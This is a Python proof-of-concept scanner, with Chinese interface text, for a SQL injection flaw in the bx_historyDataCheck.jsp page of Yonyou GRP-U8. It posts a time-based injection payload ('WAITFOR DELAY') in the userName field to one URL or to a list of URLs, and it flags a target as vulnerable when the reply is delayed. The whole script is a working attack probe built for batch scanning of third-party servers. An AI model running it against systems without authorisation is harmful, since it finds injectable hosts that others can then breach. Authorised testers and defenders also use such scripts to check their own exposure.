import hashlib
import urllib
import requests
import warnings
import argparse
import sys
import time

banner="""
              ________        
              |  ____|   (_)        
              | |__ ___  | |
              |  __/ _ \ | |
              | | |  __/ | |
              |_|  \___| |_|
                version:1.0
用友GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞检测脚本
                Author：昱子              
"""

headere = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

poc = "u8qx/bx_historyDataCheck.jsp"


def poccheck(url):
    data = "userName=';WAITFOR DELAY '0:0:5'--&ysnd=&historyFlag="
    try:
        start_time = time.time()
        response = requests.post(url=url + poc, headers=headere, data=data)
        if time.time() - start_time > 5:
            print("[+] {} 疑似存在SQL漏洞！！！".format(url))
        else:
            print("[-] {} 未发现SQL漏洞".format(url))
    except Exception as e:
        print("url:{} 请求失败".format(url))

if __name__ == '__main__':
    print(banner)
    parser = argparse.ArgumentParser(usage='\npython3 poc.py -u http://xxxx/\npython3 poc.py -f file.txt',
                                     description='用友GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞检测脚本\nAuthor：昱子\n')
    p = parser.add_argument_group('参数')
    p.add_argument("-u", "--url", type=str, help="测试单条url")
    p.add_argument("-f", "--file", type=str, help="测试多个url文件")
    args = parser.parse_args()
    if not args.url and not args.file:
        print("请输入 -u 参数指定 URL 地址：python3 poc.py -u url")
        parser.print_help()
        exit()
    if args.url:
        poccheck(args.url)
    if args.file:
        for i in open(args.file, "r").read().split("\n"):
            poccheck(i)
 
